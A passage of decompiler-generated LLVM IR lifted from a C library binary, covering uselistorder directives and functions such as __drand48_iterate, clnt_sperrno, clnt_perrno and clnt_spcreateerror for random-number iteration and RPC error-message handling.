  uselistorder i32 (i32, i32)* @__GI_strcasecmp, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 31, 32, 33, 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 6, { 47, 48, 49, 50, 51, 11, 12, 56, 1, 26, 0, 2, 3, 27, 13, 4, 52, 53, 6, 7, 28, 29, 30, 31, 25, 5, 54, 14, 55, 8, 15, 16, 17, 18, 9, 19, 10, 20, 32, 33, 34, 21, 35, 36, 22, 37, 38, 39, 40, 41, 42, 23, 43, 24, 44, 45, 46 }
  uselistorder i32* @global_var_1004515c, { 0, 3, 1, 4, 5, 6, 2 }
  uselistorder i32 35, { 1, 3, 2, 4, 0 }
  uselistorder i32 ()* @__errno_location, { 56, 44, 42, 55, 39, 38, 30, 52, 136, 135, 134, 133, 132, 131, 130, 142, 141, 140, 139, 27, 129, 37, 36, 24, 23, 22, 64, 81, 128, 29, 32, 31, 8, 77, 63, 62, 61, 60, 127, 126, 125, 25, 26, 58, 114, 13, 72, 124, 50, 123, 122, 121, 51, 66, 138, 3, 2, 35, 34, 33, 0, 49, 48, 80, 79, 78, 17, 59, 46, 12, 11, 10, 87, 71, 47, 21, 94, 91, 90, 95, 93, 54, 53, 70, 120, 7, 20, 99, 119, 118, 82, 100, 40, 9, 28, 69, 76, 43, 4, 117, 45, 41, 16, 6, 5, 1, 116, 115, 113, 19, 18, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 144, 98, 137, 97, 96, 15, 14, 92, 89, 68, 67, 88, 86, 85, 84, 83, 143, 57, 75, 74, 73, 65 }
  uselistorder i32* @r21, { 15, 16, 14, 17, 18, 19, 20, 21, 22, 23, 24, 5, 6, 7, 8, 9, 10, 11, 12, 25, 26, 27, 28, 0, 1, 2, 3, 4, 13 }
  uselistorder i32* @r23, { 12, 9, 10, 11, 13, 16, 21, 22, 23, 1, 14, 15, 29, 30, 2, 3, 4, 5, 6, 7, 24, 25, 26, 27, 28, 17, 18, 20, 19, 0, 8 }
  uselistorder i32* @r22, { 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 24, 25, 26, 29, 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 27, 28, 22, 23, 11 }
  uselistorder i32* @r25, { 43, 44, 42, 45, 22, 23, 49, 50, 51, 52, 55, 56, 57, 46, 47, 48, 18, 19, 20, 21, 69, 72, 40, 41, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 58, 59, 60, 61, 62, 63, 64, 35, 36, 53, 54, 15, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 16, 17, 1, 65, 66, 67, 68, 70, 71, 37, 2, 38, 39 }
  uselistorder i32 80, { 5, 17, 4, 3, 2, 1, 15, 12, 11, 6, 13, 7, 14, 8, 0, 9, 10, 16 }
  uselistorder i32 56, { 11, 17, 18, 6, 3, 4, 5, 24, 13, 14, 12, 10, 19, 20, 1, 15, 16, 9, 0, 7, 8, 21, 22, 23, 2 }
  uselistorder i32 44, { 16, 17, 18, 21, 22, 23, 24, 10, 3, 4, 5, 6, 7, 8, 9, 25, 11, 19, 0, 20, 14, 12, 13, 26, 27, 1, 2, 15 }
  uselistorder i32* @r26, { 63, 64, 65, 68, 66, 67, 69, 70, 71, 72, 73, 29, 30, 31, 32, 39, 40, 78, 1, 79, 80, 81, 82, 83, 84, 85, 90, 91, 2, 74, 75, 76, 77, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 33, 34, 35, 36, 37, 38, 112, 113, 4, 5, 6, 7, 8, 9, 10, 114, 115, 116, 117, 141, 60, 61, 62, 137, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 55, 56, 86, 87, 88, 89, 11, 3, 12, 13, 14, 15, 138, 118, 119, 120, 121, 122, 123, 125, 124, 126, 127, 128, 129, 130, 131, 132, 133, 0, 139, 140, 104, 110, 111, 105, 106, 107, 57, 134, 135, 136, 108, 109, 58, 59 }
  uselistorder i32 48, { 18, 19, 9, 10, 21, 22, 1, 23, 24, 25, 5, 26, 27, 2, 0, 11, 12, 13, 3, 14, 15, 28, 29, 20, 16, 8, 30, 31, 17, 6, 7, 4 }
  uselistorder i32 36, { 16, 17, 18, 19, 20, 21, 22, 23, 12, 13, 10, 25, 8, 9, 24, 26, 27, 14, 11, 15, 1, 2, 5, 6, 7, 0, 3, 4 }
  uselistorder i32 -44, { 1, 0, 2 }
  uselistorder i32 -48, { 4, 3, 7, 6, 5, 1, 2, 8, 0 }
  uselistorder i32* @r27, { 99, 100, 101, 102, 103, 104, 4, 105, 106, 107, 108, 48, 49, 50, 51, 166, 190, 191, 192, 193, 194, 195, 58, 59, 117, 2, 118, 119, 120, 121, 122, 123, 124, 125, 126, 131, 109, 0, 110, 111, 112, 113, 114, 115, 116, 5, 35, 36, 37, 3, 38, 39, 40, 41, 42, 43, 44, 45, 46, 1, 47, 155, 156, 157, 52, 53, 54, 55, 56, 57, 158, 159, 160, 161, 162, 163, 164, 165, 167, 168, 196, 6, 197, 13, 203, 208, 97, 98, 149, 198, 202, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 132, 133, 134, 135, 136, 137, 71, 72, 14, 73, 8, 7, 127, 128, 129, 130, 93, 94, 95, 96, 17, 18, 19, 9, 20, 10, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 204, 205, 206, 169, 170, 138, 139, 140, 171, 172, 11, 173, 174, 175, 176, 15, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 16, 33, 34, 188, 189, 207, 141, 142, 143, 144, 153, 154, 79, 80, 145, 146, 147, 148, 78, 12, 199, 200, 201, 74, 75, 76, 77, 86, 88, 87, 150, 151, 152, 81, 82, 83, 84, 85, 89, 90, 91, 92 }
  uselistorder i32 -32, { 2, 3, 0, 1 }
  uselistorder i32* @r24, { 22, 20, 21, 23, 24, 25, 2, 28, 29, 30, 1, 26, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 36, 37, 38, 39, 40, 41, 42, 0, 31, 32, 33, 34, 35, 3, 4, 5, 6, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 19 }
  uselistorder i32 32, { 110, 111, 112, 56, 113, 114, 124, 122, 86, 46, 47, 115, 2, 3, 87, 88, 89, 92, 4, 90, 5, 91, 93, 94, 75, 76, 77, 78, 6, 79, 80, 123, 125, 57, 55, 126, 127, 43, 44, 108, 109, 139, 7, 8, 9, 45, 58, 40, 116, 95, 106, 107, 82, 37, 81, 36, 117, 118, 119, 128, 129, 59, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 120, 102, 41, 60, 42, 38, 51, 10, 96, 97, 83, 84, 72, 73, 121, 98, 99, 100, 101, 85, 105, 140, 141, 103, 12, 13, 11, 15, 14, 61, 39, 16, 74, 17, 18, 104, 19, 20, 62, 22, 21, 24, 48, 23, 63, 26, 25, 64, 28, 27, 66, 30, 29, 65, 68, 32, 31, 67, 52, 1, 49, 53, 54, 69, 50, 70, 34, 35, 33, 71 }
  uselistorder i32* @r16, { 0, 4, 5, 6, 1, 7, 2, 3 }
  uselistorder i32* @r17, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* @r18, { 4, 5, 6, 7, 8, 1, 9, 10, 0, 11, 2, 3 }
  uselistorder i32* @r19, { 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 16, 17, 2 }
  uselistorder i32* @r20, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 11, 12, 13, 14, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10028228, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_100281f8, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_100281f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100281b0, { 1, 0 }
  uselistorder label %dec_label_pc_100281a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10028184, { 1, 0 }
  uselistorder label %dec_label_pc_10028144, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100280d4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10028124, { 1, 0 }
  uselistorder label %dec_label_pc_100280bc, { 1, 0 }
  uselistorder label %dec_label_pc_10028090, { 1, 0 }
  uselistorder label %dec_label_pc_10028074, { 1, 0 }
  uselistorder label %dec_label_pc_10027fdc, { 1, 0 }
  uselistorder label %dec_label_pc_10027f70, { 1, 0 }
}

define i32 @__drand48_iterate() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10028240 = load i32, i32* @r4, align 4
  %v1_10028240 = add i32 %v0_10028240, 14
  %v2_10028240 = inttoptr i32 %v1_10028240 to i16*
  %v3_10028240 = load i16, i16* %v2_10028240, align 2
  %v4_10028240 = zext i16 %v3_10028240 to i32
  store i32 %v4_10028240, i32* %r0.global-to-local, align 4
  %v3_10028248 = icmp eq i16 %v3_10028240, 0
  %v0_10028250 = load i32, i32* @r3, align 4
  store i32 %v0_10028250, i32* %r31.global-to-local, align 4
  br i1 %v3_10028248, label %dec_label_pc_10028258, label %dec_label_pc_1002827c

dec_label_pc_10028258:                            ; preds = %entry
  store i32 5, i32* %r9.global-to-local, align 4
  store i32 -554899859, i32* %r10.global-to-local, align 4
  %v3_10028268 = add i32 %v0_10028240, 12
  %v4_10028268 = inttoptr i32 %v3_10028268 to i16*
  store i16 11, i16* %v4_10028268, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10028270 = load i32, i32* %r9.global-to-local, align 4
  %v1_10028270 = load i32, i32* @r4, align 4
  %v2_10028270 = add i32 %v1_10028270, 16
  %v3_10028270 = inttoptr i32 %v2_10028270 to i32*
  store i32 %v0_10028270, i32* %v3_10028270, align 4
  %v0_10028274 = load i32, i32* %r10.global-to-local, align 4
  %v1_10028274 = load i32, i32* @r4, align 4
  %v2_10028274 = add i32 %v1_10028274, 20
  %v3_10028274 = inttoptr i32 %v2_10028274 to i32*
  store i32 %v0_10028274, i32* %v3_10028274, align 4
  %v0_10028278 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028278 = trunc i32 %v0_10028278 to i16
  %v2_10028278 = load i32, i32* @r4, align 4
  %v3_10028278 = add i32 %v2_10028278, 14
  %v4_10028278 = inttoptr i32 %v3_10028278 to i16*
  store i16 %v1_10028278, i16* %v4_10028278, align 2
  %v0_1002827c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1002829c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1002827c

dec_label_pc_1002827c:                            ; preds = %entry, %dec_label_pc_10028258
  %v0_100282bc = phi i32 [ %v0_10028240, %entry ], [ %v0_1002829c.pre, %dec_label_pc_10028258 ]
  %v2_100282e0 = phi i32 [ %v0_10028250, %entry ], [ %v0_1002827c.pre, %dec_label_pc_10028258 ]
  %v1_1002827c = add i32 %v2_100282e0, 4
  %v2_1002827c = inttoptr i32 %v1_1002827c to i16*
  %v3_1002827c = load i16, i16* %v2_1002827c, align 2
  %v4_1002827c = zext i16 %v3_1002827c to i32
  store i32 %v4_1002827c, i32* %r10.global-to-local, align 4
  %v1_10028284 = add i32 %v2_100282e0, 2
  %v2_10028284 = inttoptr i32 %v1_10028284 to i16*
  %v3_10028284 = load i16, i16* %v2_10028284, align 2
  %v4_10028284 = zext i16 %v3_10028284 to i32
  store i32 %v4_10028284, i32* %r7.global-to-local, align 4
  %v1_1002828c = inttoptr i32 %v2_100282e0 to i16*
  %v2_1002828c = load i16, i16* %v1_1002828c, align 2
  %v3_1002828c = zext i16 %v2_1002828c to i32
  store i32 %v4_1002827c, i32* %r9.global-to-local, align 4
  %v1_10028294 = mul nuw i32 %v4_10028284, 65536
  store i32 %v1_10028294, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_1002829c = add i32 %v0_100282bc, 20
  %v2_1002829c = inttoptr i32 %v1_1002829c to i32*
  %v3_1002829c = load i32, i32* %v2_1002829c, align 4
  store i32 %v3_1002828c, i32* %r10.global-to-local, align 4
  %v1_100282a4 = add i32 %v0_100282bc, 16
  %v2_100282a4 = inttoptr i32 %v1_100282a4 to i32*
  %v3_100282a4 = load i32, i32* %v2_100282a4, align 4
  %v2_100282b0 = or i32 %v3_1002828c, %v1_10028294
  store i32 %v4_1002827c, i32* %r7.global-to-local, align 4
  %v2_100282b8 = mul i32 %v3_100282a4, %v2_100282b0
  %v1_100282bc = add i32 %v0_100282bc, 12
  %v2_100282bc = inttoptr i32 %v1_100282bc to i16*
  %v3_100282bc = load i16, i16* %v2_100282bc, align 2
  %v4_100282bc = zext i16 %v3_100282bc to i32
  %v2_100282c0 = mul i32 %v3_1002829c, %v4_1002827c
  %v2_100282c4 = zext i32 %v2_100282b0 to i64
  %v3_100282c4 = zext i32 %v3_1002829c to i64
  %v4_100282c4 = mul nuw i64 %v3_100282c4, %v2_100282c4
  %v5_100282c4 = udiv i64 %v4_100282c4, 4294967296
  %v6_100282c4 = trunc i64 %v5_100282c4 to i32
  %v2_100282c8 = add i32 %v2_100282b8, %v2_100282c0
  %v2_100282cc = mul i32 %v3_1002829c, %v2_100282b0
  %v2_100282d0 = add i32 %v2_100282c8, %v6_100282c4
  store i32 %v2_100282d0, i32* %r9.global-to-local, align 4
  %v2_100282d4 = add i32 %v4_100282bc, %v2_100282cc
  store i32 %v2_100282d4, i32* @r8, align 4
  %v3_100282d4 = icmp ult i32 %v2_100282d4, %v2_100282cc
  %v4_100282d8 = zext i1 %v3_100282d4 to i32
  %v5_100282d8 = add i32 %v4_100282d8, %v2_100282d0
  store i32 %v5_100282d8, i32* %r7.global-to-local, align 4
  %v1_100282dc = mul i32 %v5_100282d8, 65536
  store i32 %v1_100282dc, i32* %r0.global-to-local, align 4
  %v1_100282e0 = trunc i32 %v2_100282d4 to i16
  store i16 %v1_100282e0, i16* %v1_1002828c, align 2
  %v0_100282e4 = load i32, i32* @r8, align 4
  %v1_100282e4 = udiv i32 %v0_100282e4, 65536
  %v0_100282e8 = load i32, i32* %r7.global-to-local, align 4
  %v0_100282ec = load i32, i32* %r0.global-to-local, align 4
  %v2_100282ec = or i32 %v0_100282ec, %v1_100282e4
  store i32 %v2_100282ec, i32* @r10, align 4
  %v1_100282f0 = trunc i32 %v0_100282e8 to i16
  %v2_100282f0 = load i32, i32* %r31.global-to-local, align 4
  %v3_100282f0 = add i32 %v2_100282f0, 4
  %v4_100282f0 = inttoptr i32 %v3_100282f0 to i16*
  store i16 %v1_100282f0, i16* %v4_100282f0, align 2
  %v0_100282f4 = load i32, i32* @r10, align 4
  %v1_100282f4 = trunc i32 %v0_100282f4 to i16
  %v2_100282f4 = load i32, i32* %r31.global-to-local, align 4
  %v3_100282f4 = add i32 %v2_100282f4, 2
  %v4_100282f4 = inttoptr i32 %v3_100282f4 to i16*
  store i16 %v1_100282f4, i16* %v4_100282f4, align 2
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100282cc, { 1, 0 }
  uselistorder i32 %v2_100282b0, { 0, 2, 1 }
  uselistorder i32 %v3_1002829c, { 0, 2, 1 }
  uselistorder i32 %v1_10028294, { 1, 0 }
  uselistorder i32* @r8, { 111, 112, 18, 83, 84, 85, 86, 87, 88, 19, 45, 46, 113, 117, 44, 89, 90, 91, 65, 118, 119, 120, 175, 41, 3, 7, 178, 176, 177, 20, 17, 92, 21, 42, 43, 22, 47, 114, 115, 48, 116, 23, 8, 121, 122, 99, 100, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 71, 4, 72, 9, 73, 74, 75, 0, 76, 10, 77, 78, 11, 107, 108, 109, 110, 49, 50, 179, 79, 5, 80, 24, 25, 51, 52, 53, 26, 104, 105, 54, 55, 93, 94, 12, 96, 97, 98, 33, 34, 35, 36, 37, 38, 39, 186, 187, 13, 61, 62, 63, 155, 101, 102, 103, 106, 156, 95, 157, 158, 159, 160, 161, 162, 163, 14, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 1, 174, 27, 28, 56, 180, 181, 2, 182, 6, 15, 16, 184, 183, 185, 57, 58, 40, 59, 60, 32, 30, 31, 64, 66, 67, 29, 68, 69, 70, 81, 82 }
  uselistorder i32 65536, { 5, 3, 4, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 91, 21, 22, 23, 96, 92, 0, 98, 1, 93, 2, 97, 24, 25, 26, 28, 27, 29, 94, 30, 31, 32, 33, 34, 95, 35, 36, 38, 37, 39, 40, 41, 43, 42, 44, 46, 45, 48, 47, 49, 52, 51, 50, 53, 57, 54, 58, 55, 59, 56, 60, 62, 61, 64, 63, 65, 67, 66, 70, 68, 72, 73, 74, 71, 69, 78, 75, 79, 76, 81, 80, 77, 82, 85, 83, 86, 84, 89, 87, 90, 88 }
  uselistorder i32 20, { 117, 118, 107, 108, 109, 52, 23, 110, 2, 121, 51, 134, 119, 36, 37, 38, 39, 40, 41, 42, 43, 120, 53, 54, 55, 56, 57, 58, 59, 44, 60, 61, 62, 63, 64, 111, 112, 122, 123, 124, 125, 65, 66, 114, 67, 0, 45, 46, 47, 48, 138, 139, 126, 127, 128, 129, 130, 132, 133, 131, 136, 113, 74, 135, 115, 32, 33, 34, 35, 49, 50, 68, 69, 70, 71, 72, 73, 116, 137, 75, 76, 77, 78, 79, 80, 81, 24, 20, 19, 25, 82, 26, 27, 22, 21, 28, 83, 29, 30, 3, 4, 84, 85, 86, 5, 6, 87, 88, 89, 7, 8, 90, 91, 9, 10, 92, 93, 94, 95, 1, 12, 11, 96, 97, 98, 14, 13, 99, 100, 101, 16, 15, 102, 103, 104, 105, 106, 17, 18, 31 }
  uselistorder i32 16, { 241, 242, 201, 46, 202, 203, 47, 204, 205, 4, 206, 95, 243, 252, 244, 22, 92, 245, 5, 6, 86, 87, 88, 89, 207, 208, 253, 254, 90, 7, 8, 0, 246, 111, 209, 216, 217, 91, 23, 48, 69, 70, 247, 93, 94, 96, 97, 248, 98, 99, 49, 100, 101, 102, 249, 50, 71, 72, 250, 251, 103, 104, 105, 106, 107, 108, 277, 210, 211, 212, 213, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 278, 268, 15, 192, 109, 239, 110, 24, 112, 17, 113, 114, 51, 16, 115, 116, 52, 117, 118, 119, 120, 121, 14, 221, 222, 218, 9, 219, 220, 73, 74, 75, 18, 76, 77, 79, 78, 80, 82, 83, 81, 84, 294, 295, 296, 297, 223, 224, 225, 226, 227, 228, 214, 215, 229, 230, 231, 269, 270, 271, 272, 273, 274, 279, 280, 281, 232, 10, 233, 234, 136, 275, 53, 122, 123, 124, 125, 282, 283, 284, 285, 290, 291, 292, 293, 286, 287, 288, 19, 126, 127, 240, 1, 2, 11, 67, 12, 25, 68, 13, 128, 129, 289, 3, 130, 131, 132, 133, 134, 135, 85, 276, 137, 54, 138, 139, 140, 141, 142, 55, 143, 144, 145, 146, 147, 148, 56, 149, 57, 150, 58, 151, 20, 59, 152, 60, 61, 62, 153, 154, 155, 26, 156, 27, 28, 157, 63, 158, 29, 159, 160, 30, 161, 31, 162, 32, 163, 164, 165, 33, 166, 167, 168, 34, 169, 170, 35, 171, 172, 36, 173, 174, 175, 37, 176, 38, 177, 39, 178, 40, 179, 41, 180, 181, 182, 183, 42, 184, 64, 185, 186, 187, 43, 188, 189, 190, 44, 191, 193, 194, 195, 196, 45, 21, 197, 198, 199, 200, 235, 236, 237, 65, 238, 66 }
  uselistorder i32 5, { 61, 59, 60, 7, 8, 62, 9, 10, 11, 31, 1, 2, 30, 32, 33, 0, 34, 35, 6, 36, 37, 12, 38, 39, 40, 3, 63, 64, 41, 42, 43, 13, 14, 15, 16, 4, 44, 45, 46, 47, 17, 18, 19, 20, 21, 48, 49, 22, 50, 51, 23, 24, 25, 5, 26, 52, 53, 54, 55, 56, 27, 28, 57, 29, 58 }
  uselistorder i16 0, { 18, 0, 12, 19, 13, 1, 2, 3, 4, 5, 20, 22, 21, 23, 14, 24, 17, 15, 6, 7, 8, 25, 9, 10, 11, 16, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder label %dec_label_pc_1002827c, { 1, 0 }
}

define i32 @__GI_clnt_sperrno() local_unnamed_addr {
entry:
  br label %dec_label_pc_1002833c

dec_label_pc_1002831c:                            ; preds = %dec_label_pc_1002833c
  %v1_10028340 = add nuw nsw i32 %v0_1002833c, 1
  %v3_1002831c = inttoptr i32 %v2_10028344 to i32*
  %v4_1002831c = load i32, i32* %v3_1002831c, align 4
  %v1_10028320 = load i32, i32* @r3, align 4
  %v4_10028320 = icmp eq i32 %v4_1002831c, %v1_10028320
  br i1 %v4_10028320, label %dec_label_pc_10028328, label %dec_label_pc_1002833c

dec_label_pc_10028328:                            ; preds = %dec_label_pc_1002831c
  %v1_10028328 = add i32 %v1_1002833c, add (i32 ptrtoint (i32* @global_var_1002fe60.1424 to i32), i32 4)
  %v2_10028328 = inttoptr i32 %v1_10028328 to i32*
  %v3_10028328 = load i32, i32* %v2_10028328, align 4
  %v2_10028334 = add i32 %v3_10028328, ptrtoint ([13 x i8]* @global_var_1002fef0.1425 to i32)
  ret i32 %v2_10028334

dec_label_pc_1002833c:                            ; preds = %dec_label_pc_1002831c, %entry
  %v0_10028348 = phi i32 [ %v1_10028348, %dec_label_pc_1002831c ], [ 19, %entry ]
  %v0_1002833c = phi i32 [ %v1_10028340, %dec_label_pc_1002831c ], [ 0, %entry ]
  %v1_1002833c = mul i32 %v0_1002833c, 8
  %v2_10028344 = add i32 %v1_1002833c, ptrtoint (i32* @global_var_1002fe60.1424 to i32)
  store i32 %v2_10028344, i32* @r10, align 4
  %v1_10028348 = add nsw i32 %v0_10028348, -1
  %v2_10028348 = icmp eq i32 %v1_10028348, 0
  br i1 %v2_10028348, label %dec_label_pc_1002834c, label %dec_label_pc_1002831c

dec_label_pc_1002834c:                            ; preds = %dec_label_pc_1002833c
  ret i32 ptrtoint ([26 x i8]* @global_var_1002fc68.1426 to i32)

; uselistorder directives
  uselistorder i32 %v1_10028348, { 1, 0 }
  uselistorder i32 %v2_10028344, { 1, 0 }
  uselistorder i32* @r10, { 50, 141, 142, 19, 101, 18, 102, 103, 104, 105, 106, 80, 81, 107, 108, 109, 82, 145, 146, 147, 178, 179, 47, 1, 6, 181, 180, 61, 62, 110, 20, 111, 112, 52, 48, 49, 0, 51, 53, 54, 55, 143, 56, 25, 26, 27, 28, 29, 30, 57, 148, 149, 7, 120, 2, 121, 8, 122, 123, 124, 125, 126, 150, 151, 152, 5, 153, 154, 9, 90, 10, 91, 92, 93, 94, 134, 11, 135, 136, 137, 138, 139, 58, 59, 60, 184, 185, 182, 12, 183, 13, 95, 63, 64, 127, 21, 130, 114, 113, 3, 116, 117, 118, 119, 36, 38, 37, 40, 39, 41, 42, 43, 44, 45, 46, 100, 73, 74, 75, 76, 77, 155, 156, 128, 129, 131, 132, 133, 157, 115, 190, 158, 159, 160, 162, 163, 164, 161, 23, 14, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 4, 24, 144, 189, 16, 17, 15, 186, 188, 187, 66, 65, 22, 67, 31, 32, 33, 34, 35, 68, 69, 70, 71, 72, 78, 79, 97, 83, 84, 85, 86, 87, 88, 89, 96, 98, 99, 140 }
  uselistorder i32 19, { 0, 2, 7, 8, 9, 1, 10, 5, 6, 3, 4 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  store i32 268600168, i32* @lr, align 4
  %v0_10028364 = call i32 @__rpc_thread_variables()
  %v1_10028368 = add i32 %v0_10028364, 156
  %v2_10028368 = inttoptr i32 %v1_10028368 to i32*
  %v3_10028368 = load i32, i32* %v2_10028368, align 4
  store i32 %v3_10028368, i32* @r3, align 4
  store i32 268600176, i32* @lr, align 4
  %v0_1002836c = call i32 @free()
  ret i32 %v0_1002836c

; uselistorder directives
  uselistorder i32 ()* @free, { 63, 55, 60, 13, 12, 32, 31, 30, 29, 28, 27, 26, 25, 59, 58, 57, 56, 14, 54, 9, 62, 61, 11, 10, 8, 7, 6, 5, 4, 3, 2, 1, 53, 52, 51, 50, 49, 48, 47, 46, 24, 23, 22, 21, 20, 34, 19, 18, 38, 37, 39, 17, 0, 45, 44, 36, 35, 16, 43, 42, 41, 40, 33, 15 }
}

define i32 @clnt_perrno() local_unnamed_addr {
entry:
  %v0_10028380 = load i32, i32* @lr, align 4
  %v0_10028390 = call i32 @__GI_clnt_sperrno()
  %v3_1002839c = load i32, i32* @global_var_1004513c, align 4
  store i32 %v0_10028380, i32* @lr, align 4
  %v3_100283ac = call i32 @__GI_fputs(i32 %v0_10028390, i32 %v3_1002839c, i32 268697600)
  ret i32 %v3_100283ac
}

define i32 @_buf() local_unnamed_addr {
entry:
  %v0_100283b8 = load i32, i32* @r31, align 4
  store i32 268600260, i32* @lr, align 4
  %v0_100283c0 = call i32 @__rpc_thread_variables()
  %v1_100283c4 = add i32 %v0_100283c0, 156
  %v2_100283c4 = inttoptr i32 %v1_100283c4 to i32*
  %v3_100283c4 = load i32, i32* %v2_100283c4, align 4
  store i32 256, i32* @r3, align 4
  %v3_100283d0 = icmp eq i32 %v3_100283c4, 0
  br i1 %v3_100283d0, label %dec_label_pc_100283d8, label %dec_label_pc_100283e0

dec_label_pc_100283d8:                            ; preds = %entry
  store i32 268600284, i32* @lr, align 4
  %v0_100283d8 = call i32 @malloc()
  %v1_100283dc = load i32, i32* @r31, align 4
  %v2_100283dc = add i32 %v1_100283dc, 156
  %v3_100283dc = inttoptr i32 %v2_100283dc to i32*
  store i32 %v0_100283d8, i32* %v3_100283dc, align 4
  %v0_100283e4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100283e0

dec_label_pc_100283e0:                            ; preds = %entry, %dec_label_pc_100283d8
  %v0_100283e4 = phi i32 [ %v0_100283c0, %entry ], [ %v0_100283e4.pre, %dec_label_pc_100283d8 ]
  %v1_100283e4 = add i32 %v0_100283e4, 156
  %v2_100283e4 = inttoptr i32 %v1_100283e4 to i32*
  %v3_100283e4 = load i32, i32* %v2_100283e4, align 4
  store i32 %v0_100283b8, i32* @r31, align 4
  ret i32 %v3_100283e4

; uselistorder directives
  uselistorder i32 ()* @malloc, { 44, 47, 3, 2, 13, 12, 49, 48, 7, 46, 45, 43, 5, 4, 42, 1, 50, 0, 14, 11, 10, 36, 37, 41, 26, 40, 39, 38, 35, 34, 15, 33, 32, 31, 30, 29, 28, 27, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 6, 9, 8 }
  uselistorder i32 256, { 68, 0, 1, 2, 3, 58, 57, 74, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 54, 66, 69, 15, 16, 17, 18, 19, 20, 21, 78, 22, 79, 80, 81, 82, 23, 24, 25, 26, 27, 59, 55, 75, 60, 28, 29, 30, 31, 32, 33, 34, 35, 70, 67, 36, 37, 38, 76, 39, 40, 77, 41, 42, 43, 44, 45, 46, 47, 48, 56, 83, 61, 49, 50, 51, 52, 53, 62, 63, 71, 72, 73, 64, 65 }
  uselistorder i32 156, { 1, 2, 3, 0, 4 }
  uselistorder i32 ()* @__rpc_thread_variables, { 13, 18, 6, 17, 16, 15, 14, 12, 2, 0, 4, 11, 3, 10, 1, 9, 5, 8, 7 }
  uselistorder label %dec_label_pc_100283e0, { 1, 0 }
}

define i32 @clnt_spcreateerror() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-1048 = alloca i32, align 4
  %v0_10028404 = load i32, i32* @r3, align 4
  store i32 %v0_10028404, i32* @r29, align 4
  store i32 268600336, i32* @lr, align 4
  %v0_1002840c = call i32 @_buf()
  store i32 %v0_1002840c, i32* @r30, align 4
  %v3_10028410 = icmp eq i32 %v0_1002840c, 0
  br i1 %v3_10028410, label %dec_label_pc_10028500, label %dec_label_pc_10028418

dec_label_pc_10028418:                            ; preds = %entry
  store i32 268600348, i32* @lr, align 4
  %v0_10028418 = call i32 @__GI___rpc_thread_createerr()
  %v0_1002842c = load i32, i32* @r30, align 4
  store i32 %v0_1002842c, i32* @r3, align 4
  store i32 268600376, i32* @lr, align 4
  %v1_10028434 = call i32 @sprintf(i32 %v0_1002842c)
  %v0_1002843c = load i32, i32* @r30, align 4
  %v2_1002843c = add i32 %v0_1002843c, %v1_10028434
  store i32 %v2_1002843c, i32* %r29.global-to-local, align 4
  %v0_10028440 = load i32, i32* @r31, align 4
  %v1_10028440 = inttoptr i32 %v0_10028440 to i32*
  %v2_10028440 = load i32, i32* %v1_10028440, align 4
  store i32 %v2_10028440, i32* @r3, align 4
  %v0_10028444 = call i32 @__GI_clnt_sperrno()
  %v2_10028450 = inttoptr i32 %v0_10028444 to i8*
  %v3_10028450 = call i32 @strcpy(i32 %v2_1002843c, i8* %v2_10028450)
  %v0_10028454 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10028454, i32* @r3, align 4
  %v0_10028458 = call i32 @__GI_strlen()
